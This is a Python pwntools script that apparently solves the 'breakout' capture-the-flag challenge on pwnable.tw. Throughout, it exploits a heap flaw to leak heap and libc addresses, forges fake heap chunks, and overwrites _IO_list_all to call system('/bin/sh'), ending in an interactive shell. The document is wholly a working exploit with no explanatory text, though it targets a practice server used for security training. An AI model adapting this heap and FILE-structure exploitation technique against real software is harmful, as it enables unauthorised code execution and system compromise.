from pwn import *

e = ELF("./breakout")
libc = ELF("./libc.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10400)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

def alloc(cell, size, msg):
  p.sendline("note")
  p.sendlineafter("Cell:", str(cell))
  p.sendlineafter("Size:", str(size))
  p.sendafter("Note:", msg)
  p.recvuntil(">")



p.recvuntil(">")
p.sendline("note")
p.sendlineafter("Cell:", "0")
p.sendlineafter("Size:", str(0x1000))
p.sendlineafter("Note:", "")
p.recvuntil(">")

alloc(1, 0x28, "AAAA")


p.sendline("punish")
p.sendlineafter("Cell:", "1")
p.recvuntil(">")

alloc(2, 0x40, p64(0) * 3 + p32(0) + p32(1337) + "\x50")

p.sendline("list")
p.recvuntil("Cell: 1337")
p.recvuntil("Sentence: ")

heap_leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x559e92c1c440 + 0x559e92c1c0f0
print("{:#x}".format(heap_leak))

p.recvuntil(">")

alloc(2, 0x48, p64(0) * 3 + p32(0) + p32(1337) + p64(heap_leak) + p64(0) *2 + p64(0)[:6])


p.sendline("list")
p.recvuntil("Cell: 1337")
p.recvuntil("Sentence: ")

libc_base = u64(p.recvline(keepends=False).ljust(8, "\x00")) + 0x00007f769887e000 - 0x7f7698c41b88  
print("{:#x}".format(libc_base))


p.recvuntil(">")


chunk = heap_leak + 0x5651eafe9890 - 0x5651eafe80f0 - 0x10 - 0x1450
alloc(2, 0x48, p64(0) * 3 + p32(0) + p32(1337) + p64(heap_leak) + p64(0x10000) + p64(chunk) + p64(0)[:6])
alloc(1337, 0x1000, 
  p64(libc_base + libc.symbols["system"]) + p64(0xa1).ljust(0xa0, "\x00")
  + p64(0x101).ljust(0x100 - 8, "\x00")
  + ("/bin/sh\x00" + (p64(0x61) + p64(0) * 2 + p64(0) + p64(1)).ljust(0x60, "\x00")
  + p64(0x21).ljust(0x20)
  + p64(0x21)).ljust(0xc0, "\x00") + p64(0) * 3 + p64(chunk - 0x18)
)

alloc(2, 0x48, p64(0) * 3 + p32(0) + p32(1337) + p64(heap_leak) + p64(0x10) + p64(chunk + 0x10 + 0x1a0))
alloc(1337, 0x200, "A")

alloc(2, 0x48, p64(0) * 3 + p32(0) + p32(1337) + p64(heap_leak) + p64(0) + p64(chunk + 0x10 + 0x1a0))
alloc(1337, 0x1000, "A")

alloc(2, 0x48, p64(0) * 3 + p32(0) + p32(1337) + p64(heap_leak) + p64(0x10) + p64(chunk + 0x10))
alloc(1337, 0x200, "A")

alloc(2, 0x48, p64(0) * 3 + p32(0) + p32(1337) + p64(heap_leak) + p64(0x50) + p64(chunk + 0x10))
alloc(1337, 0x30, p64(0) + p64(libc_base + libc.symbols["_IO_list_all"] - 0x10))
alloc(2, 0x48, p64(0) * 3 + p32(0) + p32(1337) + p64(heap_leak) + p64(0) + p64(0))
alloc(1337, 0x90, "A")

p.sendline("exit")

p.interactive()
